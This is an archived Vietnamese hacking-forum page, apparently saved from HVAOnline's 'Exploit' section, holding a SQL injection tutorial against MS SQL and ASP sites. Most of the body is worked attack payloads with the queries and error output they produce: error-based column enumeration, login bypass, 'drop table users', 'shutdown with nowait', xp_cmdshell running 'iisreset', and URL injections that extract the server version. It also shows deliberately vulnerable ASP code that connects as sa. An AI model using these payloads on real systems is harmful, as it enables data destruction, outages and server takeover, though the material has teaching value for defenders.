@@ -1,0 +1,185 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+<meta name="description" content="HVA Reading Room">
+<meta name="keywords" content=", reading room, hva, hvaonline, hvazone, hvaforum">
+<meta name="resource-type" content="document">
+<meta name="distribution" content="global">
+<meta name="robots" content="index,follow">
+<meta name="rating" content="general">
+<style type="text/css">
+<!-- 
+@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
+-->
+</style>
+<style type="text/css">
+<!--
+@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
+-->
+</style>
+<title> - .:: HVAOnline ::.</title>
+
+</head>
+<body class="en_US">
+
+
+<!--
+Original theme from phpBB (http://www.phpbb.com) subSilver
+Created by subBlue design
+http://www.subBlue.com
+Modifications by JForum Team 
+Extended and customised by HVA Team
+Added more features and Black Silver theme designed by HVA
+-->
+<table width="100%" border="0" cols="2">
+	<tr align="right">
+		<td class="copyright">
+			English
+			| 
+			<a href="/hvaonline/jforum.hva?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
+		</td>
+	</tr>
+</table>
+<table width="100%" border="0" align="center">
+	<tr>
+        <td width="100%" align="center" valign="middle">
+			<a href="http://www.hvaonline.net" title="[Logo]"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" /></a>
+		</td>
+	</tr>
+
+	<tr>
+		<td>
+<table cellspacing="0" cellpadding="0" width="80%" align="center" border="0">
+
+		<tr height="15">
+			<th colspan="2" class="thportal" align="left"><span class="readingheader">&nbsp;.::Exploit::.</span></th>
+		    <th class="thportal" align="center">
+				<span class="readingheader">
+					 SQL Injection Tutorial - Sưu tầm của HVA cũ <a name="topPage" id="topPage"></a>
+				</span>
+			</th>
+		    <th class="thportal" align="right">
+				<a href="/hvaonline/posts/list/0/382.hva#913" target="_blank">
+				<img src="/hvaonline/templates/viet/images/goright.gif" align="absbottom" border="0" alt="Go to original post" title="Go to original post"/></a> 
+				<img src="/hvaonline/templates/viet/images/what.gif" align="absbottom" border="0" alt="Author: Unknown - Translator: BigballVN Sưu Tầm - Entry Date: 14/02/2009 01:28:54" title="Author: Unknown - Translator: BigballVN Sưu Tầm - Entry Date: 14/02/2009 01:28:54"/>
+			</th>
+		</tr>
+</table>
+
+<table cellspacing="0" cellpadding="5" width="80%" align="center" border="0">
+		<tr>
+		    <td align="left" colspan="2" class="readingborderBottom">
+				<table cellspacing="0" cellpadding="10" width="95%" align="center" border="0">
+					<tr>
+						<td align="left">
+							<div class="postbody">Ví dụ 1:<br/> Microsoft SQL phát triển riêng cho mình 1 cách viết lệnh SQL mới , còn gọi là Transact SQL, hay TSQL. Tôi sẽ sử dụng sức mạnh của TSQL để mô tả về cách thức tấn công SQL Injection. Hãy dựa vào câu SQL mà chúng ta đang xem xét. Giả sử tôi nhập vào :<br/> <br/> Username: ' having 1=1 --- <br/> Password: [Anything]<br/> <br/> Câu SQL trở thành<br/> <br/> CODE  <br/> select userName from users where userName='' having 1=1 <br/> <br/> <br/> <br/> Và ngay lập tức , Ms.SQL báo lỗi và gửi trả về màn hình trang web:<br/> <br/> Microsoft OLE DB Provider for SQL Server (0x80040E14)<br/> Column 'users.userName' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.<br/> <br/> /login.asp, line 16<br/> <br/> Nhìn kỹ lại thông báo và chúng ta thấy rằng Ms.SQL đã để lộ 2 thông tin cho người dùng vô danh (ở đây là chúng ta đang thử khai thác lỗi SQL Injection) là tên của 1 Field và tên của Table mà chúng ta đang muốn xâm nhập , field "users.userName" . Sử dụng tên có được này chúng ta dùng cú pháp LIKE :<br/> <br/> Username: ' or users.userName like 'a%' --- <br/> Password: [Anything]<br/> <br/> và câu SQL trở thành<br/> <br/> CODE  <br/> select userName from users where userName='' or <br/> users.userName like 'a%' --' and userPass='' <br/> <br/> <br/> <br/> Câu SQL này thu thập tất cả những users có Username bắt đầu là "a" và trong trường hợp này là admin<br/> <br/> Logged In As admin<br/> <br/> Ví dụ 2:<br/> Ngôn ngữ SQL qui định dấu ';' là kết thúc 1 câu query và sau dấu ';' là một câu query mới. Ví dụ như<br/> select 1; select 1+2; select 1+3; sẽ thực hiện cả 3 câu query. Lợi dụng điều này , ta hãy làm như sau:<br/> <br/> Username: ' or 1=1; drop table users; -- <br/> Password: [Anything]<br/> <br/> Và ...phù, toàn bộ dữ liệu về users của website biến mất.<br/> <br/> Ví dụ 3:<br/> Trong ví dụ này tôi sẽ cho bạn thấy việc khai thác sự tiện lợi của TSQL có thể làm biến mất Database hoặc thậm chí shutdown luôn IIS. Chúng ta sẽ xem xét 1 số lệnh đặc biệt của Ms.SQL và phần "stored procedures". Đa số website khi kết nối với Database thường sử dụng account sa(default system account) để kết nối từ ASP đến Ms.SQL. Mặc định , account sa có toàn quyền , bao gồm delete, rename, và thêm vào database, table , triggers....<br/> <br/> Nào bây giờ chúng ta hãy nhập vào:<br/> <br/> Username: '; shutdown with nowait; -- <br/> Password: [Anything]<br/> <br/> Một trong những lệnh "nguy hiểm" nhất của Ms.SQL là SHUTDOWN WITH NOWAIT . Khi nhận lệnh này , toàn bộ server Ms.SQL ngừng hoạt động hoàn toàn và chỉ restart và làm việc lại khi được ra lệnh bằng tay từ trình SQL service manager , hoặc tab Services của Windows. Và khi bạn nhập vào như trên , câu SQL trở thành<br/> <br/> <br/> CODE  <br/> select userName from users where userName=''; <br/> shutdown with nowait; --' and userPass='' <br/> <br/> <br/> <br/> Nếu website sử dụng account sa và bị khai thác lỗi như trên , nó sẽ dừng hoàn toàn phần Database từ 1giây cho đến vài ngày , dừng đến khi nào có người phát hiện ra là nó đã bị dừng và khởi động nó lại bằng tay.<br/> <br/> SQL Server cũng có sẵn (Includes) một vài thủ tục (stored procedures) được viết bằng C++ DLL. Những thủ tục này được dùng để vận hành SQL Server một cách dễ dàng như đọc thư mục , registry , xóa files, chạy 1 dòng lệnh command... Toàn bộ stored procedures thường bắt đầu bằng "xp_". Có 1 vài stored procedures có thể gây nguy hiểm cho server. Hãy xem xét , giả sử IIS chạy cùng server với SQL server và chúng ta nhập vào:<br/> <br/> Username: '; exec master..xp_cmdshell 'iisreset'; -- <br/> Password: [Anything]<br/> <br/> Câu lệnh SQL trở thành<br/> <br/> <br/> CODE  <br/> select userName from users where userName=''; <br/> exec master..xp_cmdshell 'iisreset'; --' and userPass='' <br/> <br/> <br/> <br/> Ngạc nhiên chưa ? Sau khi SQL Server biến mất thì bây giờ toàn bộ website biến mất !!!<br/> <br/> Ví dụ 4:<br/> Bây giờ, chúng ta sẽ chuyển qua 1 thứ mà chúng ta thường gặp hơn. Thông thường khi vào những website thương mại , bạn thường thấy URL có dạng như sau:<br/> <br/> www.mysite.com/products.asp?productId=2<br/> <br/> Trong đó, ID = 2 là mã hàng hoá và câu lệnh để lấy thông tin về hàng hoá là<br/> <br/> CODE  <br/> Select prodName from products where id = 2 <br/> <br/> <br/> <br/> Và chúng ta hãy tạo 1 files có nhiệm vụ đưa ra thông tin hàng hoá là products.asp như sau<br/> <br/> CODE  <br/> &lt;% &lt;br/&gt; dim prodId <br/> prodId = Request.QueryString("productId") <br/> <br/> set conn = server.createObject("ADODB.Connection") <br/> set rs = server.createObject("ADODB.Recordset") <br/> <br/> query = "select prodName from products where id = " & prodId <br/> <br/> conn.Open "Provider=SQLOLEDB; Data Source=(local); <br/> Initial Catalog=myDB; User Id=sa; Password=" <br/> rs.activeConnection = conn <br/> rs.open query <br/> <br/> if not rs.eof then <br/> response.write "Got product " & rs.fields("prodName").value <br/> else <br/> response.write "No product found" <br/> end if <br/> %&gt; <br/> <br/> <br/> Sau đó chúng ta nhập vào dòng URL của Browser<br/><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"> http://www.mysite.com/products.asp?productId=0%20having%201=1</span></span></span></span></span></span></span></span></span></span></span></span></span></span><br/> <br/> Ngay lập tức, trình duyệt sẽ báo lỗi như sau<br/> <br/> Microsoft OLE DB Provider for SQL Server (0x80040E14) <br/> <br/> Column 'products.prodName' is invalid in the select <br/> list because it is not contained in an aggregate <br/> function and there is no GROUP BY clause. <br/> <br/> /products.asp, line 13<br/> <br/> Cũng như ví dụ trên, 2 thông tin mà chúng ta khai thác được là Table products và Field prodName . Tiếp theo , với những thông tin đã biết được , ta tiếp tục đánh vào<br/> <br/><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"> http://www.mysite.com/products.asp?productId=0;insert%20into%20products</span></span></span></span></span></span></span></span></span></span></span></span></span></span> <br/> (prodName)%20values(left(@@version,50))<br/> <br/> Câu URL trên đã chạy lệnh INSERT và thêm vào 1 row mới trong database, tại field prodName là 50 chữ cái thông tin về phiên bản Ms.SQL đang chạy tại server (Do biến @@version tạo ra). Vấn đề còn lại là lấy field đó ra trở lại<br/> <br/><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"><span class="link"> http://www.mysite.com/products.asp?productId=(select%20max(id</span></span></span></span></span></span></span></span></span></span></span></span></span></span>) <br/> %20from%20products)<br/> <br/> Max(id) để bảo đảm lấy được hàng cuối cùng chứa thông tin mà chúng ta vừa thêm vào. Hãy xem bạn đã lấy được gì<br/> <br/> Got product Microsoft SQL Server 2000 - 8.00.534 (Intel X86)<br/> Đây là 1 thông tin vô cùng quí giá, nó cho phép Hackers tiếp theo lợi dụng những lổ hổng Security Bugs từ phiên bản này để tiếp tục tấn công và chiếm toàn quyền điều khiển server. <br/> </div>
+						</td>
+					</tr>
+
+					<tr>
+						<td align="left"><a href="http://digg.com/submit?phrase=2&url=http://www.hvaonline.net/hvaonline/readingRoom/item/913.hva"><img src="/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
+<a href="http://del.icio.us/post?url=http://www.hvaonline.net/hvaonline/readingRoom/item/913.hva"><img src="/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
+<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=http://www.hvaonline.net/hvaonline/readingRoom/item/913.hva"><img src="/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
+<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=http://www.hvaonline.net/hvaonline/readingRoom/item/913.hva"><img src="/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
+<a href="http://technorati.com/faves?add=http://www.hvaonline.net/hvaonline/readingRoom/item/913.hva"><img src="/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
+<a href="http://reddit.com/submit?url=http://www.hvaonline.net/hvaonline/readingRoom/item/913.hva"><img src="/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
+<a href="http://www.stumbleupon.com/submit?url=http://www.hvaonline.net/hvaonline/readingRoom/item/913.hva"><img src="/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+
+		<tr>
+			<td align="left" colspan="2" class="readingborderBottom">
+				<table cellspacing="0" cellpadding="10" width="95%" align="center" border="0">
+					<tr>
+						<td align="left">
+						<div class="postbody"><b>Other posts in the same group:</b></div><br />
+									<div class="gen"><a href="/hvaonline/readingRoom/item/910.hva">SQL Injection Tutorial - Sưu tầm của HVA cũ</a></div>
+									<div class="gen"><a href="/hvaonline/readingRoom/item/911.hva">Re: SQL Injection Tutorial - Sưu tầm của HVA cũ</a></div>
+									<div class="gen"><b>SQL Injection Tutorial - Sưu tầm của HVA cũ</b></div>
+									<div class="gen"><a href="/hvaonline/readingRoom/item/914.hva">SQL Injection Tutorial - Sưu tầm của HVA cũ</a></div>
+						</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+
+
+		<tr>
+			<td align="left" valign="top">
+				<a href="#topPage"><img src="/hvaonline/templates/viet/images/goup.gif" align="absbottom" border="0" alt="Go to top" title="Go to top"></a>
+				<a href="/hvaonline/posts/list/0/382.hva#913" target="_blank"><img src="/hvaonline/templates/viet/images/goright.gif" border="0" align="absbottom" alt="Go to original post" title="Go to original post"></a> 
+				&nbsp;
+			</td>
+			<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
+		<tr>			  
+			<td nowrap="nowrap">
+				<form action="" name="f" id="f" accept-charset="UTF-8">
+					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/readingRoom/show/'+ this.options[this.selectedIndex].value +'.hva'; }" name="select">
+						<option value="0" selected="selected">Go to Category</option>	
+						<option value="0">------------------------</option>	
+								<option value="1">Defense</option>
+								<option value="2">Exploit</option>
+								<option value="3">Reverse Engineering</option>
+								<option value="4">*nix</option>
+								<option value="5">Windows</option>
+								<option value="6">Networking</option>
+								<option value="7">Others</option>
+					</select>
+				</form>
+			</td>
+		</tr>
+	</table>
+</td>
+		</tr>
+</table>
+<script type="text/javascript">
+		var ctlTop = false;
+		var ctlBt = false;
+
+		function activateControllerTop()
+		{
+			ctlTop = !ctlTop;
+			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
+			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
+			document.getElementById("controllerTop").style.display = (ctlTop ? "" : "none");
+
+			if (ctlTop) {
+				document.location = document.location + "#ctlTop";
+			}
+		}
+
+		function activateControllerBottom()
+		{
+			ctlBt = !ctlBt;
+			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
+			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
+			document.getElementById("controllerBottom").style.display = (ctlBt ? "" : "none");
+
+			if (ctlBt) {
+				document.location = document.location + "#ctlBt";
+			}
+		}
+</script>
+
+	<tr>	
+		<td align="center">
+		<br>
+					</td>
+	</tr>
+
+	<tr>
+		<td align="center">
+			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
+			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
+			1999 - 2013 &copy;
+			v2012|0504|218|
+		  </span>
+	  </td>
+	</tr>
+<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
+</body>
+</html>
